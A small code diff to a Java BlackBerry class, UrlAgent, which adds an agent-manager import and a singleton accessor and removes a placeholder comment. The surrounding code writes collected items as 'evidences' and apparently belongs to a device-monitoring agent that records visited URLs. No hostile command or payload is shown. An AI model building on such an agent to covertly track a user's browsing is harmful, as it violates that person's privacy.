@@ -13,6 +13,7 @@ import java.util.Date;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
+import blackberry.AgentManager;
 import blackberry.AppListener;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
@@ -25,7 +26,7 @@ import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
-// TODO: Auto-generated Javadoc
+
 /**
  * The Class UrlAgent.
  */
@@ -191,5 +192,10 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         evidence.writeEvidences(items);
         evidence.close();
 
+    }
+
+    public static UrlAgent getInstance() {
+        return (UrlAgent) AgentManager.getInstance().getItem(
+                Agent.AGENT_URL);
     }
 }
